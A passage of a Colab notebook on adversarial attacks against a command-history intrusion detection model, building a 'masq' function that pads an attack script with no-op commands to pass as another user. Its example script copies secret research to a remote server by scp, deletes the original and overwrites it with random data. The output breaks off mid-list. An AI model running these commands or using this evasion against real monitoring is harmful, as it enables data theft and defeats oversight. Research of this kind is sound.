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\n",
            "text/plain": [
              "<Figure size 576x396 with 2 Axes>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "metadata": {
        "id": "n4LMIjjaMbmb",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "So our modified method gives much better results for targeted attacks, lets see how it compares for untargeted attacks. We have tried to do this below, but the commented part breaks."
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "IegvI9jAMaJz",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Craft adversarial examples using the substitute\n",
        "x_adv_sub_ami = ami_attack.generate(input_placeholder, **ami_params)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "outputId": "ba072e72-9e56-4873-9c0d-944ec9bc5c99",
        "id": "CvgUg5w6MaKe",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "cell_type": "code",
      "source": [
        "x_adv_sub_ami"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<tf.Tensor 'Identity_3:0' shape=(?, 856) dtype=float32>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 64
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "6LGNE2HLMaK1",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "oracle_ami_test = KerasModelWrapper(oracle)\n",
        "oracle_ami_pred = oracle_ami_test.get_logits(x_adv_sub_ami)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "outputId": "b968b217-e6ef-47af-9a94-ae8e773ea7f2",
        "id": "Lvqn-37vMaLB",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "cell_type": "code",
      "source": [
        "adversary_test_labels_one_hot.shape, adversary_test_inputs.shape"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "((232798, 50), (232798, 856))"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 66
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "B9LNGbH5MaLQ",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# # Evaluate the accuracy of the \"black-box\" model on adversarial examples [BROKEN]\n",
        "# untargetted_accuracy_ami = model_eval(\n",
        "#         tensorflow_session,\n",
        "#         input_placeholder,\n",
        "#         output_placeholder,\n",
        "#         oracle_ami_pred,\n",
        "#         adversary_test_inputs,\n",
        "#         adversary_test_labels_one_hot,\n",
        "#         args=eval_params\n",
        "# )\n",
        "# print('Test accuracy of oracle on adversarial examples generated '\n",
        "#     'using the substitute: ' + str(accuracy))"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "Lg3WsDFbVs0s",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# An End-to-End Attack\n",
        "\n",
        "In this section, we use the models and attacks developed above to perform a complete attack on the intrusion detection system.\n",
        "\n",
        "First we define two functions:\n",
        "  1. `script_to_command_vector` :: converts a list of bash commands into a command vector (as if it were generated by `acct`).\n",
        "  2. `pad_script` :: takes an input script and generats an output script with the same behaviour, but with the command counts specified by command_vector."
      ]
    },
    {
      "metadata": {
        "id": "EY8jUsNCKSxq",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "def script_to_command_vector(script):\n",
        "    lines = script.split(\"\\n\")  # ['netscape', 'sh ./my-script.sh', ...]\n",
        "    commands = [\n",
        "        line.split(\" \")[0] for line in lines\n",
        "    ]  # ['netscape', 'sh', ...]\n",
        "    \n",
        "    commands = pandas.Series(commands).astype(command_dtype)\n",
        "    commands_one_hot = pandas.get_dummies(commands)\n",
        "    command_counts = commands_one_hot.sum()\n",
        "    \n",
        "    return command_counts"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "clLauLU2Wu7O",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# For our proof-of-concept, just append --help to turn our commands into no-ops. This won't\n",
        "# actually work for all of these commands, but proves the point.\n",
        "COMMAND_TO_NOOP = {command: command + \" --help\" for command in commands}\n",
        "\n",
        "def pad_script(original_script, target_command_counts):\n",
        "    # First, calculate the command counts of the input script:\n",
        "    original_command_counts = script_to_command_vector(original_script)\n",
        "    \n",
        "    # Find the number of each command we need to pad by:\n",
        "    additional_command_counts = target_command_counts - original_command_counts\n",
        "    \n",
        "    # Loop over additional_command_counts and append no-op commands for each additional\n",
        "    # command needed:\n",
        "    padded_script = original_script\n",
        "    \n",
        "    pandas.Series(additional_command_counts).astype(command_dtype)\n",
        "    \n",
        "    for index, count in enumerate(additional_command_counts):\n",
        "        command = labelled_dataset.columns[index]\n",
        "        \n",
        "        for _ in range(int(count)):\n",
        "            padded_script += \"\\n \" + COMMAND_TO_NOOP[command]\n",
        "         \n",
        "    \n",
        "    return padded_script"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "vbefZdBhEESX",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Here we define the `masq()` function, the entry point to our attack, and run it on the example from the main report. The output is very long, but note theres one more code cell at the very end, which you can modify with your own examples!"
      ]
    },
    {
      "metadata": {
        "id": "FqrpRkx4Wq1p",
        "colab_type": "code",
        "outputId": "76f79dcb-7565-46fd-bc72-8691c1876249",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 12695
        }
      },
      "cell_type": "code",
      "source": [
        "def masq(script, target_user, aggressiveness=1.0):\n",
        "    command_vector = script_to_command_vector(script)\n",
        "    original_command_vectors = numpy.array([command_vector])\n",
        "\n",
        "    target_labels = keras.utils.to_categorical(numpy.array([target_user]), num_classes=50)\n",
        "    \n",
        "    ami_params['y_target'] = target_labels\n",
        "    ami_params['eps'] = int(aggressiveness*100)\n",
        "\n",
        "    adversarial_examples = ami_attack.generate_np(\n",
        "        original_command_vectors,\n",
        "        **ami_params\n",
        "    )\n",
        "\n",
        "    predicted_labels = oracle.predict(adversarial_examples)\n",
        "    \n",
        "    adversarial_example = adversarial_examples[0]\n",
        "    predicted_label = numpy.argmax(predicted_labels[0])\n",
        "    \n",
        "    if predicted_label == target_user:\n",
        "        fool = 'We have fooled the model to predict user ' + str(target_user) + '. Here is your attack script: \\n'\n",
        "        fool += pad_script(script, adversarial_example)\n",
        "    else:\n",
        "        fool = 'The model has predicted user ' + str(predicted_label) +' We have failed to fool the model... oh dear.'\n",
        "        \n",
        "    print(fool)\n",
        "    \n",
        "\n",
        "# Run masq( ) on the example from our report:\n",
        "masq(\n",
        "    script=\"\"\"\n",
        "ls\n",
        "scp -r top-secret-research dans-server:/my-stash-of-stolen-files\n",
        "sudo rm top-secret-research/data-source.csv\n",
        "head -n 100 < /dev/urandom | tr -dc A-Za-z0-9 > top-secret-research/data-source.csv\n",
        "    \"\"\",\n",
        "    target_user=0,\n",
        "    aggressiveness=0.01,  # aggressiveness of 0.01 works fo 16/49 users\n",
        "    )"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "We have fooled the model to predict user 0. Here is your attack script: \n",
            "\n",
            "ls\n",
            "scp -r top-secret-research dans-server:/my-stash-of-stolen-files\n",
            "sudo rm top-secret-research/data-source.csv\n",
            "head -n 100 < /dev/urandom | tr -dc A-Za-z0-9 > top-secret-research/data-source.csv\n",
            "    \n",
            " %backup% --help\n",
            " .java_wr --help\n",
            " .maker_w --help\n",
            " .wrapper --help\n",
            " .xinitrc --help\n",
            " .xsessio --help\n",
            " 1.1 --help\n",
            " 1.3 --help\n",
            " 4Dwm --help\n",
            " 5650.exe --help\n",
            " 5836.exe --help\n",
            " 7105.exe --help\n",
            " 8117.exe --help\n",
            " 8708.exe --help\n",
            " 9term --help\n",
            " = --help\n",
            " == --help\n",
            " =p --help\n",
            " Archie --help\n",
            " BATCH --help\n",
            " CC --help\n",
            " Configur --help\n",
            " DC-prn --help\n",
            " FIFO --help\n",
            " FvwmPage --help\n",
            " LOCK --help\n",
            " Mail --help\n",
            " Main --help\n",
            " MakeTeXP --help\n",
            " MediaMai --help\n",
            " Mosaic --help\n",
            " OLI.sh --help\n",
            " PLATFORM --help\n",
            " R --help\n",
            " Reducyr --help\n",
            " Sizup --help\n",
            " Slmclien --help\n",
            " Slmhelpe --help\n",
            " Sqpe --help\n",
            " Tracy --help\n",
            " UNLOCK --help\n",
            " X --help\n",
            " Xremote --help\n",
            " [ --help\n",
            " a.out --help\n",
            " aa.new.n --help\n",
            " aa.new.s --help\n",
            " aacdec --help\n",
            " acc.prof --help\n",
            " accesspo --help\n",
            " acroread --help\n",
            " admin --help\n",
            " agrep --help\n",
            " aiffplay --help\n",
            " ama.chec --help\n",
            " apanel --help\n",
            " appdefpa --help\n",
            " ar --help\n",
            " arp --help\n",
            " array_te --help\n",
            " as --help\n",
            " ascii --help\n",
            " at --help\n",
            " augment_ --help\n",
            " aupanel --help\n",
            " auplay --help\n",
            " aus --help\n",
            " autoconf --help\n",
            " awk --help\n",
            " awk.html --help\n",
            " basename --help\n",
            " bash --help\n",
            " bb_rep --help\n",
            " bb_rep_f --help\n",
            " bb_rep_n --help\n",
            " bb_rep_t --help\n",
            " bc --help\n",
            " bdftopcf --help\n",
            " bdiff --help\n",
            " be --help\n",
            " bind_so_ --help\n",
            " bindkey --help\n",
            " binhex --help\n",
            " bison --help\n",
            " blossom4 --help\n",
            " bo_rep --help\n",
            " bo_rep_c --help\n",
            " bo_rep_f --help\n",
            " bo_rep_t --help\n",
            " bo_table --help\n",
            " bo_top --help\n",
            " bo_type --help\n",
            " btbuild --help\n",
            " btcreat --help\n",
            " byte_rev --help\n",
            " c++filt --help\n",
            " c++patch --help\n",
            " cal --help\n",
            " calendar --help\n",
            " call_fil --help\n",
            " calldd --help\n",
            " calprog --help\n",
            " cancel --help\n",
            " cat --help\n",
            " catalog --help\n",
            " catdoc --help\n",
            " cc1 --help\n",
            " cdc --help\n",
            " cdec --help\n",
            " cfe --help\n",
            " cgiparse --help\n",
            " chat.awk --help\n",
            " chkconfi --help\n",
            " chmod --help\n",
            " chown --help\n",
            " ci --help\n",
            " cled --help\n",
            " cled_jct --help\n",
            " cmex --help\n",
            " co --help\n",
            " col --help\n",
            " colthloo --help\n",
            " colthrea --help\n",
            " comm --help\n",
            " comma.te --help\n",
            " comp_uni --help\n",
            " compress --help\n",
            " concorde --help\n",
            " config.g --help\n",
            " config.s --help\n",
            " configur --help\n",
            " conftest --help\n",
            " convert --help\n",
            " cpeek --help\n",
            " cpio --help\n",
            " cplex --help\n",
            " cpp --help\n",
            " crnl --help\n",
            " crontab --help\n",
            " csh --help\n",
            " ctags --help\n",
            " cut --help\n",
            " cxwsh --help\n",
            " data_cl. --help\n",
            " date --help\n",
            " dbl --help\n",
            " dbx --help\n",
            " dbxpcs --help\n",
            " dc --help\n",
            " dd --help\n",
            " ddd --help\n",
            " ddtest --help\n",
            " dec --help\n",
            " delatex --help\n",
            " delta --help\n",
            " demo --help\n",
            " deroff --help\n",
            " desktopM --help\n",
            " detail_o --help\n",
            " detex --help\n",
            " dev.X11 --help\n",
            " dev.moti --help\n",
            " dev.post --help\n",
            " df --help\n",
            " dialog.s --help\n",
            " dict --help\n",
            " diff --help\n",
            " dig --help\n",
            " dirname --help\n",
            " do.hourl --help\n",
            " do.priso --help\n",
            " do.trit --help\n",
            " doc2ps --help\n",
            " doctype --help\n",
            " domainna --help\n",
            " dot --help\n",
            " download --help\n",
            " dpost --help\n",
            " dprog --help\n",
            " drag --help\n",
            " drag2 --help\n",
            " drawgrap --help\n",
            " drf --help\n",
            " drill_do --help\n",
            " driver --help\n",
            " ds_ar --help\n",
            " du --help\n",
            " dummy --help\n",
            " dvipost --help\n",
            " dviselec --help\n",
            " e --help\n",
            " echo --help\n",
            " ed --help\n",
            " edg_prel --help\n",
            " edgcpfe --help\n",
            " edgegen --help\n",
            " efm --help\n",
            " egrep --help\n",
            " elm --help\n",
            " emacs-20 --help\n",
            " enc --help\n",
            " endsessi --help\n",
            " engine --help\n",
            " enscript --help\n",
            " env --help\n",
            " eptofax --help\n",
            " eqn --help\n",
            " euphony --help\n",
            " euphony3 --help\n",
            " ex --help\n",
            " expr --help\n",
            " exrecove --help\n",
            " extract_ --help\n",
            " f --help\n",
            " f2ps --help\n",
            " fa.booku --help\n",
            " fa.click --help\n",
            " faces --help\n",
            " false --help\n",
            " fcom --help\n",
            " fec --help\n",
            " fecc --help\n",
            " fgrep --help\n",
            " field --help\n",
            " fig2dev --help\n",
            " file --help\n",
            " find --help\n",
            " find_RT --help\n",
            " findobj --help\n",
            " finger --help\n",
            " fish2 --help\n",
            " fish4 --help\n",
            " flex --help\n",
            " flog --help\n",
            " flow --help\n",
            " fls_star --help\n",
            " fm --help\n",
            " fm_flb --help\n",
            " fm_misd --help\n",
            " fmarch --help\n",
            " fmprintd --help\n",
            " fmt --help\n",
            " fold --help\n",
            " foo --help\n",
            " force_up --help\n",
            " format.d --help\n",
            " frm --help\n",
            " ftp --help\n",
            " ftp.orig --help\n",
            " fvwm --help\n",
            " fx --help\n",
            " fxfilter --help\n",
            " fxprint --help\n",
            " fxsend --help\n",
            " fxshut --help\n",
            " fxstat --help\n",
            " fxstatus --help\n",
            " fxvision --help\n",
            " gawk --help\n",
            " gcc --help\n",
            " gdb --help\n",
            " gdiff --help\n",
            " generic --help\n",
            " gengraph --help\n",
            " get --help\n",
            " get.line --help\n",
            " get_acc --help\n",
            " get_acc_ --help\n",
            " get_line --help\n",
            " getans --help\n",
            " getconf --help\n",
            " gethost --help\n",
            " getopt --help\n",
            " getpgrp --help\n",
            " getsampl --help\n",
            " gettxt --help\n",
            " gftopk --help\n",
            " ghostvie --help\n",
            " giftrans --help\n",
            " gimp --help\n",
            " gnuplot --help\n",
            " gnuplot_ --help\n",
            " gordon --help\n",
            " gp --help\n",
            " gr_top --help\n",
            " gramlx --help\n",
            " graph_te --help\n",
            " gre --help\n",
            " grep --help\n",
            " groups --help\n",
            " gs --help\n",
            " gs3.33 --help\n",
            " gsftopk --help\n",
            " gv --help\n",
            " head --help\n",
            " heartche --help\n",
            " help --help\n",
            " help.fin --help\n",
            " help.key --help\n",
            " help.sor --help\n",
            " help.top --help\n",
            " hightoll --help\n",
            " hilow --help\n",
            " hippo --help\n",
            " history --help\n",
            " hoc --help\n",
            " host --help\n",
            " hostname --help\n",
            " hpost --help\n",
            " htn_date --help\n",
            " htn_edit --help\n",
            " htn_repo --help\n",
            " id --help\n",
            " identify --help\n",
            " imake --help\n",
            " imgview --help\n",
            " infocmp --help\n",
            " inline --help\n",
            " install- --help\n",
            " interest --help\n",
            " ispell --help\n",
            " java --help\n",
            " javac --help\n",
            " join --help\n",
            " jot --help\n",
            " jre --help\n",
            " justlex --help\n",
            " justspec --help\n",
            " keep_up --help\n",
            " kill --help\n",
            " killall --help\n",
            " kludgepl --help\n",
            " kmist --help\n",
            " ksh --help\n",
            " last --help\n",
            " lattice_ --help\n",
            " launchef --help\n",
            " lc --help\n",
            " lcc --help\n",
            " ld --help\n",
            " ld64_ --help\n",
            " ld_ --help\n",
            " less --help\n",
            " lex --help\n",
            " lex.spec --help\n",
            " line.pro --help\n",
            " lint --help\n",
            " lint1 --help\n",
            " lint2 --help\n",
            " list.pl --help\n",
            " list2.pl --help\n",
            " lks --help\n",
            " ln --help\n",
            " local.Sq --help\n",
            " logname --help\n",
            " long --help\n",
            " lp --help\n",
            " lp.orig --help\n",
            " lpdsend --help\n",
            " lpe3 --help\n",
            " lpq --help\n",
            " lps --help\n",
            " ls --help\n",
            " m3_binin --help\n",
            " m3_compt --help\n",
            " m3_flsd --help\n",
            " m3_manfl --help\n",
            " m4 --help\n",
            " magma.ex --help\n",
            " mail --help\n",
            " mailbox --help\n",
            " mailp --help\n",
            " mailx --help\n",
            " make --help\n",
            " make_del --help\n",
            " make_tod --help\n",
            " makeinde --help\n",
            " maker5X. --help\n",
            " makexgvi --help\n",
            " man --help\n",
            " maple.sy --help\n",
            " mapleTTY --help\n",
            " mars.sh --help\n",
            " matlab --help\n",
            " matlab_l --help\n",
            " mc --help\n",
            " mesg --help\n",
            " metamail --help\n",
            " mhl --help\n",
            " mi --help\n",
            " mimencod --help\n",
            " mkdir --help\n",
            " mklink.s --help\n",
            " more --help\n",
            " movemail --help\n",
            " moviepla --help\n",
            " mp --help\n",
            " mpeg_pla --help\n",
            " mplotcha --help\n",
            " mplotps --help\n",
            " mplottek --help\n",
            " msort --help\n",
            " munpack --help\n",
            " my.ls --help\n",
            " my.ls.re --help\n",
            " mycut --help\n",
            " mysql --help\n",
            " mysql_in --help\n",
            " mysqladm --help\n",
            " named --help\n",
            " nawk --help\n",
            " neato --help\n",
            " nedit --help\n",
            " neqn --help\n",
            " netscape --help\n",
            " netstat --help\n",
            " newalias --help\n",
            " news --help\n",
            " nice --help\n",
            " nlcrack --help\n",
            " nlgen --help\n",
            " nlx --help\n",
            " nly --help\n",
            " nlz --help\n",
            " nlz2 --help\n",
            " nm --help\n",
            " nm_elf --help\n",
            " nospool --help\n",
            " npasplit --help\n",
            " nr --help\n",
            " nroff --help\n",
            " ns-insta --help\n",
            " nscal --help\n",
            " nslookup --help\n",
            " ntrim.in --help\n",
            " nw_8s_un --help\n",
            " on --help\n",
            " op_cvmod --help\n",
            " op_mko --help\n",
            " op_mksim --help\n",
            " op_runsi --help\n",
            " orig --help\n",
            " orig_sca --help\n",
            " overlap --help\n",
            " overlap2 --help\n",
            " p --help\n",
            " pacdec --help\n",
            " pagemail --help\n",
            " panel_te --help\n",
            " passwd --help\n",
            " paste --help\n",
            " patch --help\n",
            " payphone --help\n",
            " pcst --help\n",
            " pcst.pur --help\n",
            " pcst1 --help\n",
            " pdf2ps --help\n",
            " pftp --help\n",
            " pg --help\n",
            " pine --help\n",
            " ping --help\n",
            " plaid --help\n",
            " point.sh --help\n",
            " polar --help\n",
            " popper --help\n",
            " post --help\n",
            " postprin --help\n",
            " postreve --help\n",
            " pow --help\n",
            " ppost --help\n",
            " ppq --help\n",
            " pq --help\n",
            " print_ca --help\n",
            " print_de --help\n",
            " print_do --help\n",
            " print_us --help\n",
            " printf --help\n",
            " printreq --help\n",
            " prisoncs --help\n",
            " ps --help\n",
            " ps2epsi --help\n",
            " ps2pdf --help\n",
            " psnr --help\n",
            " psu --help\n",
            " ptelnet --help\n",
            " punlx --help\n",
            " purify.s --help\n",
            " pwd --help\n",
            " q_eg --help\n",
            " q_egtest --help\n",
            " q_test --help\n",
            " qk --help\n",
            " qpage --help\n",
            " quota --help\n",
            " r --help\n",
            " random_t --help\n",
            " randseq --help\n",
            " rbnull --help\n",
            " rcc --help\n",
            " rcsdiff --help\n",
            " rdistd --help\n",
            " readacct --help\n",
            " reaper --help\n",
            " red --help\n",
            " register --help\n",
            " renice --help\n",
            " req.new --help\n",
            " resize --help\n",
            " reverse --help\n",
            " rexecd --help\n",
            " richtext --help\n",
